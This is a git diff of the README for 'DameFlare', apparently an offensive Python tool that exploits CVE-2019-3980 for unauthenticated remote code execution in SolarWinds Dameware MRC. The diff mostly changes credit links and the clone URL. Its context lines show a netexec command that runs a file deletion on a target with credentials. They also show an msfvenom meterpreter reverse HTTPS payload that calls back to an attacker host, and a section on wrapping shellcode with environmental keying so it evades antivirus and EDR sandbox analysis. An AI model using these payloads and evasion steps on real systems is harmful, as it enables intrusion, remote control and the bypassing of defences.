@@ -10,8 +10,8 @@
 **Unauthenticated RCE via Smart Card Authentication Bypass in SolarWinds Dameware MRC**
 
 > CVE-2019-3980 | CVSS 9.8 Critical | TCP/6129  
-> Original research: [Tenable, Inc. (TRA-2019-43)](https://www.tenable.com/security/research/tra-2019-43)  
-> Python 3 tool: David Boyd ([@Fir3d0g](https://github.com/Fir3d0g))
+> Original research and POC: [Tenable, Inc. (TRA-2019-43)](https://www.tenable.com/security/research/tra-2019-43)  
+> Python 3 tool: David Boyd ([@Fir3d0g](https://x.com/Fir3d0g))
 
 ---
 
@@ -35,7 +35,7 @@ DameFlare implements the full protocol handshake (version negotiation → AES ke
 ## Installation
 
 ```bash
-git clone https://github.com/fir3d0g/dameflare
+git clone https://github.com/boydhacks/dameflare
 cd dameflare
 pip3 install -r requirements.txt
 python3 dameflare.py -h
@@ -87,7 +87,7 @@ nxc smb <target> -u <user> -p <pass> -x "del /f /q C:\Windows\Temp\dwDrvInst.exe
 
 ---
 
-## Payload Generation (wrap it with something like ek47 first)
+## Payload Generation Example (wrap it with something like ek47 first)
 
 ### Raw shellcode
 ```bash
@@ -108,7 +108,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 EXITFUNC=
 
 ## Payload Evasion (ek47)
 
-Wrap raw shellcode with environmental keying to evade AV/EDR sandbox analysis. The payload will only decrypt and execute on a machine where the keys match. Huge shoutout to Kevin Clark (@GuhnooPlusLinux) for his awesome work!
+Wrap raw shellcode with environmental keying to evade AV/EDR sandbox analysis. The payload will only decrypt and execute on a machine where the keys match. Huge shoutout to Kevin Clark ([@GuhnooPlusLinux](https://x.com/GuhnooPlusLinux)) for his awesome work!
 
 > [https://gitlab.com/KevinJClark/ek47](https://gitlab.com/KevinJClark/ek47)
 
